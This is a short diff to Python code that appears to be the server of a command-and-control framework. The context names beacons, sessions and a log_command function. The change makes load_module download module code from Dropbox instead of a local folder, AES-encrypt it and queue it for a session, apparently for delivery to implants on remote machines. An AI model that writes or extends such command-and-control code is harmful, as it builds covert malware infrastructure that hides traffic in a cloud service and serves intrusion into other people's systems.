@@ -216,16 +216,13 @@ def log_command(hostname, command, results):
 
 
 def load_module(session, module_name):
-	module = "modules/" + module_name
-	if os.path.isfile(module):
-		fi = open(module, "r")
-		module_content = fi.read()
-		# encrypt module before send it
-		base64_command = encrypt_command(aes_key, aes_iv, module_content)
-		commands[session] = base64_command
-		print((colored("[+] Module should be loaded !", "green")))
-	else:
-		print((colored("[-] Module is not exist !")))
+    module = "/modules/" + module_name
+    metadata, fi = dbx.files_download(module)
+    module_content = fi.content.decode("utf-8")
+    # encrypt module before send it
+    base64_command = encrypt_command(aes_key, aes_iv, module_content)
+    commands[session] = base64_command
+    print((colored("[+] Module should be loaded !", "green")))
 
 
 def load_beacon(session, beacon_path):
